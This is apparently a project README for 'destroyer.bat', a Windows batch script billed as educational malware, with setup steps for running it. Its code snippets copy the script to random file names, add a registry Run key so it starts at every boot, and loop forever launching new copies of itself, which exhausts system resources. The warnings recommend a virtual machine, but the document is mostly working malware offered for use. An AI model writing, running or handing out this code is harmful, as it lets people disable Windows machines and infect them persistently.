🛠️ Destroyer.bat - Educational Malware for Learning Purposes
destroyer.bat is a simple Batch script designed for educational purposes, demonstrating techniques often used by malware to persist and replicate itself on a Windows system.

⚠️ Warning: This script is for educational purposes only. Use it in a controlled environment (like a virtual machine). Running this on a real system can cause harm. Do not use it maliciously.

🚀 Features
Kill-Switch mechanism to stop the script.
Self-replication across the system with random file names.
Autostart setup via Windows Registry.
Infinite loop to maintain execution as long as the Kill-Switch is active.
🧑‍💻 How It Works
Check for Kill-Switch:
The script looks for a file named kill_switch.txt on the user's Desktop. If it’s missing, the script stops.

batch
Code kopieren
set KillSwitch="C:\User\%USERNAME%\Desktop\kill_switch.txt"
if NOT exist %KillSwitch% goto end
Copy & Rename:
The script copies itself to the desktop with a random name.

batch
Code kopieren
set Dateipfad="C:\User\micha\Desktop\%Random%.bat"
copy "%~f0" %Dateipfad%
Autostart Entry:
It adds an entry to the Windows Registry to start automatically after reboot.

batch
Code kopieren
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v %RANDOM% /t REG_SZ /d "%~f0" /f
Infinite Loop:
The script enters a loop where it keeps checking for the Kill-Switch and restarting itself as long as the switch exists.

batch
Code kopieren
:loop
if NOT exist %KillSwitch% goto end
start "" "%~f0"
goto :loop
⚙️ Setup Instructions
Requirements:
🖥️ Windows System
📝 Batch scripting enabled (default on Windows)
Steps to Run:
Download and place the destroyer.bat file on your system.
Execute the script by double-clicking it.
To stop the script, remove the kill_switch.txt file from your Desktop.
💡 Tip: Use a virtual machine to safely test this script without harming your main system.

📂 File Structure
plaintext
Code kopieren
destroyer.bat   # The main script
LICENSE         # License file (MIT)
README.md       # This readme file
⚠️ Warnings & Precautions
Use in a virtual environment to prevent system damage.
The script creates persistent Registry entries for autostart. Clean these up after testing.
Do not use this script for malicious purposes. It is meant for learning only.

